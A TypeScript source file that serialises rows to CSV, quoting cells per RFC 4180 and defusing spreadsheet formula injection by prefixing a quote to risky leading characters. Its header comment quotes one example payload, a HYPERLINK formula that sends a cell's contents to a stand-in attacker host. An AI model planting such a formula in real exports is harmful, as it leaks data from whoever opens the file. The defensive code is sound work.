/**
 * CSV serialisation, safe to open in a spreadsheet.
 *
 * Two separate problems, and only the first is obvious:
 *
 * 1. **Quoting** (RFC 4180). A cell containing a comma, a quote or a newline
 *    must be wrapped in quotes with its own quotes doubled, or the row breaks
 *    apart.
 *
 * 2. **Formula injection.** Excel, Numbers and Google Sheets execute a cell
 *    that begins with `=`, `+`, `-` or `@`. Our exports carry names, ticket
 *    text and audit payloads — data a guest typed. Someone registering as
 *    `=HYPERLINK("http://attacker/"&A1,"click")` turns a compliance export into
 *    an exfiltration tool the moment an admin opens it. Prefixing a single
 *    quote makes the spreadsheet treat it as text; the value is still readable
 *    and still exact.
 */

const NEEDS_QUOTING = /[",\r\n]/;
/** Leading tab and carriage return count: spreadsheets strip them, then parse. */
const FORMULA_START = /^[=+\-@\t\r]/;

/** One cell, quoted if it must be and defused if a spreadsheet would run it. */
export function csvCell(value: unknown): string {
  if (value === null || value === undefined) return '';

  let text = typeof value === 'string' ? value : String(value);
  if (FORMULA_START.test(text)) text = `'${text}`;

  return NEEDS_QUOTING.test(text) ? `"${text.replace(/"/g, '""')}"` : text;
}

/**
 * Rows to a CSV document, CRLF-separated per RFC 4180.
 *
 * A UTF-8 byte-order mark leads the file because Excel on Windows otherwise
 * reads Cyrillic as mojibake — and this platform's clientele, and therefore
 * half of every name in an export, is Russian-speaking.
 */
export function toCsv(rows: readonly (readonly unknown[])[], options?: { bom?: boolean }): string {
  const body = rows.map((row) => row.map(csvCell).join(',')).join('\r\n');
  return options?.bom === false ? body : `﻿${body}`;
}
